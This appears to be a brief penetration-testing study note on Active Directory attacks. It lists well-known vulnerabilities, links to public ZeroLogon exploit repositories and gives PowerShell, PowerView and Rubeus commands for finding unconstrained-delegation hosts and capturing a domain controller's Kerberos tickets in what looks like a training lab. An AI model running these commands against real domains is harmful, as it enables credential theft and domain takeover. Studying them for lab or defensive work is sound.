
Most popular vulnerability in Active Directory
- ZeroLogon (Dangerous)
- PrintNightmare
- Sam the Admin
- Eternal Blue


Zerologons
https://www.trendmicro.com/en_us/what-is/zerologon.html
https://github.com/dirkjanm/CVE-2020-1472
https://github.com/SecuraBV/CVE-2020-1472

### Unconstrained Delegation:
![[Pasted image 20251010002449.png]]
![[Pasted image 20251010002500.png]]
```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description

Get-NetUser -TrustedToAuth

Import-Module .\powerview.ps1
Get-NetComputer -Unconstrained


.\Rubeus.exe monitor /monitorinterval:5 /targetuser:HYDRA-DC$ /nowrap 


Invoke-WebRequest http://HYDRA-DC.MARVEL.local -UseDefaultCredentials -UseBasicParsing
```

